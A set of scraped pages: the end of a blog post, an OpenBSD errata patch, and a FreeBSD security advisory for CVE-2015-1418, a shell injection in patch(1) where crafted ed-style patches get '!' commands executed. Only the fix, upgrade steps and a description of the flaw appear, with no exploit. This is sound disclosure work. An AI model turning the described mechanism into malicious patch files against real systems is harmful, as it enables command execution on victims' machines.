Also, I'm hearing it can't exec other programs any more, which is pretty
awesome. That's the right way to close this kind of door.

[More writing](/w/)
| [Contact / send feedback](https://rachelbythebay.com/contact/)



=== Content from ftp.openbsd.org_555d01e2_20250125_080451.html ===
untrusted comment: signature from openbsd 5.7 base secret key
RWSvUZXnw9gUb9QmNtbRWSkZday2HFut2V3vLYdrzdrPhP9+tjmNSCP80RznxEG5F8xBFCrQ5q72NXRApbEC78rss1OSsrU/igs=
OpenBSD 5.7 errata 13, Jul 30, 2015:
Substitution commands might contain a newline in the replacement pattern
(escaped with a backslash before it), causing patch's understanding of
the state the ed child process is in to diverge from reality. This can
lead to patch unwillingly feeding '!' (execute shell command) lines to
ed.
Apply by doing:
signify -Vep /etc/signify/openbsd-57-base.pub -x 013\_patch.patch.sig \
-m - | (cd /usr/src && patch -p0)
And then rebuild and install the patch utility:
cd /usr/src/usr.bin/patch
make obj
make
make install
Index: usr.bin/patch/pch.c
===================================================================
RCS file: /cvs/src/usr.bin/patch/pch.c,v
retrieving revision 1.51.2.1
diff -u -p -u -p -r1.51.2.1 pch.c
--- usr.bin/patch/pch.c 27 Jul 2015 16:10:54 -0000 1.51.2.1
+++ usr.bin/patch/pch.c 30 Jul 2015 23:36:35 -0000
@@ -1402,7 +1402,19 @@ do\_ed\_script(void)
\*t != '\0' && strchr("acdis", \*t) != NULL) {
if (pipefp != NULL)
fputs(buf, pipefp);
- if (\*t != 'd' && \*t != 's') {
+ if (\*t == 's') {
+ for (;;) {
+ bool continued = false;
+ t = buf + strlen(buf) - 1;
+ while (--t >= buf && \*t == '\\')
+ continued = !continued;
+ if (!continued ||
+ pgets(buf, sizeof buf, pfp) == NULL)
+ break;
+ if (pipefp != NULL)
+ fputs(buf, pipefp);
+ }
+ } else if (\*t != 'd') {
while (pgets(buf, sizeof buf, pfp) != NULL) {
p\_input\_line++;
if (pipefp != NULL)


=== Content from www.freebsd.org_e50dc84f_20250125_080452.html ===
-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA512
=============================================================================
FreeBSD-SA-15:18.bsdpatch Security Advisory
The FreeBSD Project
Topic: shell injection vulnerability in patch(1)
Category: contrib
Module: patch
Announced: 2015-08-05
Credits: Martin Natano
Affects: FreeBSD 10.x.
Corrected: 2015-08-05 22:05:02 UTC (stable/10, 10.2-PRERELEASE)
2015-08-05 22:05:02 UTC (stable/10, 10.2-BETA2-p3)
2015-08-05 22:05:12 UTC (releng/10.2, 10.2-RC1-p2)
2015-08-05 22:05:12 UTC (releng/10.2, 10.2-RC2-p1)
2015-08-05 22:05:18 UTC (releng/10.1, 10.1-RELEASE-p17)
CVE Name: CVE-2015-1418
For general information regarding FreeBSD Security Advisories,
including descriptions of the fields above, security branches, and the
following sections, please visit .
I. Background
The patch(1) utility takes a patch file produced by the diff(1) program and
apply the differences to an original file, producing a patched version.
The patch(1) utility supports patches that uses ed(1) script format, as
required by the POSIX.1-2008 standard.
ed(1) is a line-oriented text editor.
II. Problem Description
Due to insufficient sanitization of the input patch stream, it is possible
for a patch file to cause patch(1) to pass certain ed(1) scripts to the
ed(1) editor, which would run commands.
III. Impact
This issue could be exploited to execute arbitrary commands as the user
invoking patch(1) against a specically crafted patch file, which could be
leveraged to obtain elevated privileges.
IV. Workaround
No workaround is available, but systems where a privileged user does not
make use of patches without proper validation are not affected.
V. Solution
Perform one of the following:
1) Upgrade your vulnerable system to a supported FreeBSD stable or
release / security branch (releng) dated after the correction date.
A reboot is not required after updating.
2) To update your vulnerable system via a binary patch:
Systems running a RELEASE version of FreeBSD on the i386 or amd64
platforms can be updated via the freebsd-update(8) utility:
# freebsd-update fetch
# freebsd-update install
A reboot is not required after updating.
3) To update your vulnerable system via a source code patch:
The following patches have been verified to apply to the applicable
FreeBSD release branches.
a) Download the relevant patch from the location below, and verify the
detached PGP signature using your PGP utility.
# fetch https://security.FreeBSD.org/patches/SA-15:18/bsdpatch.patch
# fetch https://security.FreeBSD.org/patches/SA-15:18/bsdpatch.patch.asc
# gpg --verify bsdpatch.patch.asc
b) Apply the patch. Execute the following commands as root:
# cd /usr/src
# patch < /path/to/patch
c) Recompile the operating system using buildworld and installworld as
described in .
VI. Correction details
The following list contains the correction revision numbers for each
affected branch.
Branch/path Revision
- -------------------------------------------------------------------------
stable/10/ r286348
releng/10.1/ r286351
releng/10.2/ r286350
- -------------------------------------------------------------------------
To see which files were modified by a particular revision, run the
following command, replacing NNNNNN with the revision number, on a
machine with Subversion installed:
# svn diff -cNNNNNN --summarize svn://svn.freebsd.org/base
Or visit the following URL, replacing NNNNNN with the revision number:
VII. References
The latest revision of this advisory is available at
-----BEGIN PGP SIGNATURE-----
Version: GnuPG v2.1.6 (FreeBSD)
iQIcBAEBCgAGBQJVwoplAAoJEO1n7NZdz2rn8D4QAM0077U1nLiJFIU1VcM9IOKp
GeZ/w9SnkrKqKzAQpq3QS1hmw0TxvP8kuJNuRVFF6M15Woprfxccb8mDxM0ntru4
t8rq/QLO2jMWopf67Spv6jr6GLLQXkiyRwLEyr7L8a7MbrFwjO1wYt+8GnQ6Nsvn
kNfCnbNKPr1gNYM1XsLS7Ej1kl7aBx3xGQXU4d9HlOs/1X7rnPCnGKuc3ZD2Z/N4
zu8pV4NMFhWyJsax+FVYEFxwyd2uEb73A35nz/sQhGiwGOCtL424KG+hwj9mnm45
8f4m+53b6RDcBh6xU41fghMsac2PVCzY2r9GXXXJNlfEa+KnSN8yC+CvtXYEM9BX
9Y5g6i++RVLLT7mwFdG86FjZxSGpDBXlkpZ4I9qiS4YC8MFO4qC7SFzufxtfOcg+
R+QSj+DWOfeHDcXjEkHGlqTW9poE2EDWXDLwlEoOykh9NLyWl6enYd8ZEI3GUqyJ
FgKiICrs1vUuGhOhTCgjyQjQUc6jaV/GzhLBJfyxz5xYDpr7DIILxJ8uki2FJcHS
tZhlNu6JNqpBlsWNspqjw7NSP2j58Uj0bBdwWvFNX8otQiIXVfkdY8RCjxstq5lT
3bcF6akAFEBx/f/VYM1lswLM/XdbORYC3asLu84BP541EDqdx9d88TeTKNPvyb4Q
sGJ763WSlsoLrQDr8CUt
=iR0L
-----END PGP SIGNATURE-----

